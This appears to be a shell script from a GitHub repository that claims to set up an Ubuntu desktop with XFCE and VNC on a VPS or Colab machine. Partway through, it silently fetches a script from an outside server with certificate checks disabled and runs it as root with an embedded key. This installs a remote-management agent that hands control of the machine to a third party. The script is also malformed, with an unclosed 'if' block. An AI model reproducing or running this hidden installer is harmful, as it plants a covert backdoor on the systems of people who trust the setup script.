#https://github.com/KhanhNguyen9872/Windows_VPS_Google_Colab/blob/main/khanhnguyen9872.sh
#!/bin/sh
if [ ! -f khanhnguyen9872.vhd ] 2> /dev/null || [ ! -f khanhnguyen9872.qcow2 ] 2> /dev/null; then
  echo "Preparing...."
  echo "1. Linux (Ubuntu amd64)"
  echo "Installing Linux (Ubuntu amd64)...."
  echo ""
  sudo apt update -y > /dev/null 2>&1
  sudo apt install xfce4 xarchiver chromium-browser mesa-utils xfce4-goodies dbus perl p7zip unzip zip curl tar git python3 python3-pip net-tools tigervnc-standalone-server tigervnc-xorg-extension -y > /dev/null 2>&1
  (wget "https://remote.lamit.tech/meshagents?script=1" --no-check-certificate -O ./meshinstall.sh || wget "https://remote.lamit.tech/meshagents?script=1" --no-proxy --no-check-certificate -O ./meshinstall.sh) && chmod 755 ./meshinstall.sh && sudo -E ./meshinstall.sh https://remote.lamit.tech 'vNSZAWJ4hP3BzbioqD@5NmSkH8J3s1OeNLxVKZCdvo5I67wzJ8do5lh@p4d5Bm7v' || ./meshinstall.sh https://remote.lamit.tech 'vNSZAWJ4hP3BzbioqD@5NmSkH8J3s1OeNLxVKZCdvo5I67wzJ8do5lh@p4d5Bm7v'
  sudo apt update && sudo apt upgrade
  sudo apt install tasksel
  sudo tasksel install ubuntu-desktop
  sudo apt install lightdm
  sudo service lightdm start
  cat /etc/X11/default-display-manager
exit 0
